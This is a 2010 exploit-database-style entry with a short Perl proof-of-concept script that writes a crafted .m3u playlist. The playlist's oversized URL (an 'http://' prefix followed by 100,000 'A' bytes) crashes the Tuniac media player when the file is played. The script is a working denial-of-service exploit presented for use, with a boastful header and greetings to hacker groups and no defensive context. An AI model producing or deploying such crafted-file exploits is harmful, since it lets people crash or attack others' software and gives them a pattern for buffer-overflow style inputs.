# Exploit Title: Tuniac 100723 Denial of Service Vulnerability
# Author: d4rk-h4ck3r
# Date: 2010-08-19
# Software Link: http://www.brothersoft.com/tuniac-225851.html
# Greetz 2 : PASSEWORD , MadjiX , KAiSER-J , sec4ever , tli7a , All Tun!Sian h4ck3rz
# Tested on: Windows XP SP3 Fr
# Import d4rk.m3u file , click play and then boooooooooom ;)
 
 
my $hd = "#EXTM3U\n";
my $jnk="http://"."\x41" x 100000 ;
open(MYFILE,'>>d4rk.m3u');
print MYFILE $hd.$jnk;
close(MYFILE);